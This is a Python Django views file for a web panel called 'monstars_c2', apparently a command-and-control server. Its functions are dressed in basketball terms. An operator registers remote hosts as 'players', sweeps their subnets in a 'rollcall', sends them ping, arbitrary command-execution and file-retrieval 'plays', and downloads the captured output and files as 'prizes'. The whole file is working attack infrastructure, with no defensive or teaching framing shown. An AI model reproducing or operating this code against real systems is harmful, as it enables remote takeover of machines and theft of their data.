import ipaddress
import os
import socket

from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, HttpResponseNotFound, HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.utils import timezone

from monstars.controller import do_exec, do_get, do_ping, do_rollcall

from .models import Play, Player
from .util import get_prize, new_prize


def index(request):
    if request.user.is_authenticated:
        return HttpResponseRedirect(reverse("players"))
    else:
        return render(request, "monstars_c2/index.html", {}, status=401)


def signin(request):
    try:
        username = request.POST["username"]
        password = request.POST["password"]
    except KeyError:
        pass
    else:
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return HttpResponseRedirect(reverse("players"))
    return render(request, "monstars_c2/index.html", {"fail_msg": "Signin Failed!"}, status=403)


def signout(request):
    logout(request)
    return HttpResponseRedirect(reverse("index"))


@login_required(login_url="/", redirect_field_name=None)
def players(request):
    lineup = Player.objects.order_by("hostname")
    return render(
        request, "monstars_c2/players.html", {"lineup": lineup}
    )


@login_required(login_url="/", redirect_field_name=None)
def stats(request, player_id):
    player = get_object_or_404(Player, pk=player_id)
    return render(
        request,
        "monstars_c2/stats.html",
        {
            "player": player,
            "plays": player.play_set.order_by("-play_time"),
        },
    )


@login_required(login_url="/", redirect_field_name=None)
def rollcall(request):
    try:
        mask = request.POST["mask"]
        dest_port = int(request.POST["slamport"])
        listen_port = int(request.POST["jamport"])
    except KeyError:
        return HttpResponseRedirect(reverse("players"))

    lineup = Player.objects.order_by("hostname")
    subnets = set()
    for player in lineup:
        ip = socket.gethostbyname(player.hostname)
        subnet = str(ipaddress.ip_network(f"{ip}/{mask}", strict=False))
        subnets.add(subnet)

    try:
        active_players = do_rollcall(list(subnets), dest_port, listen_port, expected=len(lineup))
        for player in lineup:
            play = player.play_set.create(play_time=timezone.now(), verb="PING", scored=False)
            player.active = False
            if player.hostname in active_players:
                play.scored = True
                player.active = True
            play.save()
            player.save()
    except Exception:
        pass
    return HttpResponseRedirect(reverse("players"))



@login_required(login_url="/", redirect_field_name=None)
def makeplay(request, player_id):
    player = get_object_or_404(Player, pk=player_id)
    play_time = timezone.now()
    try:
        play_verb = request.POST["play"]
        detail = request.POST["detail"]
        dest_port = int(request.POST["slamport"])
        listen_port = int(request.POST["jamport"])
        if play_verb == "PING" and detail != "":
            raise ValueError("PING does not except additional detail")
        if play_verb in ("GET", "EXEC") and detail == "":
            raise ValueError(f"detail is required for {play_verb}")
    except Exception as err:
        return render(
            request,
            "monstars_c2/stats.html",
            {
                "player": player,
                "plays": player.play_set.order_by("-play_time"),
                "error_msg": repr(err),
            },
            status=400,
        )
    play = player.play_set.create(
        play_time=play_time, verb=play_verb, detail=detail, scored=False
    )
    try:
        if play_verb == "PING":
            do_ping(player.hostname, dest_port, listen_port)
        elif play_verb == "EXEC":
            retcode, output = do_exec(player.hostname, dest_port, listen_port, detail)
            if retcode != 0:
                play.penalty = str(retcode)
            if len(output.strip()):
                dest, uri = new_prize("stdout.txt")
                with open(dest, "w") as f:
                    f.write(output)
                play.filepath = uri
        elif play_verb == "GET":
            dest, uri = new_prize(os.path.basename(detail))
            do_get(player.hostname, dest_port, listen_port, detail, dest)
            play.filepath = uri
    except RuntimeError as err:
        play.penalty = repr(err)
    except (ConnectionError, ValueError, socket.gaierror) as err:
        play.penalty = repr(err)
        player.active = False
    else:
        player.active = True
        play.scored = True
    play.save()
    player.save()
    return HttpResponseRedirect(reverse("stats", args=(player_id,)))


@login_required(login_url="/", redirect_field_name=None)
def hire(request):
    try:
        hostname = request.POST["hostname"]
        player = Player(hostname=hostname, birthday=timezone.now())
        player.save()
    except Exception:
        pass
    return HttpResponseRedirect(reverse("players"))

@login_required(login_url="/", redirect_field_name=None)
def fire(request, player_id):
    player = get_object_or_404(Player, pk=player_id)
    player.delete()
    return HttpResponseRedirect(reverse("players"))

@login_required(login_url="/", redirect_field_name=None)
def prize(request, prize_id):
    try:
        path = get_prize(str(prize_id))
        filename = os.path.basename(path)
        with open(path, "rb") as f:
            file_data = f.read()
        if filename.endswith(".txt"):
            content_type = "text/plain"
        else:
            content_type = "application/octet-stream"
        response = HttpResponse(file_data, content_type=content_type)
        response["Content-Disposition"] = f"inline; filename={filename}"
        return response
    except Exception as err:
        return HttpResponseNotFound()
